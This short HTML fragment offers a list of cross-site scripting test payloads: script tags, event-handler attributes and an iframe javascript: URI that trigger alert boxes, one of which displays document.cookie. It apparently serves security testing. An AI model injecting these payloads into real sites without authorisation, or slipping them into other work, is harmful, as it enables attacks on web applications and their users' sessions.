
<span class="text-white bg-black text-xl font-bold"> Suggestions for cross-site scripting testing: </span>
    <br>
    <br>
    <code>
        <span class="text-gray-900 text-sm font mono font-semibold">&lt;script&gt;alert('XSS');&lt;/script&gt;<br>
        
        &lt;script type='text/javascript'&gt;alert(document.cookie);&lt;/script&gt;<br>
        &lt;script type='text/javascript'&gt;alert('xss vulnerability!');&lt;/script&gt;<br>
        &lt;img src=x onerror="alert('xss vulnerability!')"&gt;<br>
        &lt;b onmouseover="alert('xss vulnerability!')"&gt;click me&lt;/b&gt;<br>
        &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
        &lt;img src="#" onerror="alert('XSS')"/&gt;<br>
        &lt;input type="button" onclick="alert('XSS')"/&gt;<br>
        &lt;iframe src="javascript:alert('XSS');"&gt;&lt;/iframe&gt;<br>
        &lt;b onmouseover="alert(‘XSS')"&gt;click me!&lt;/b&gt;</span>
    </code>
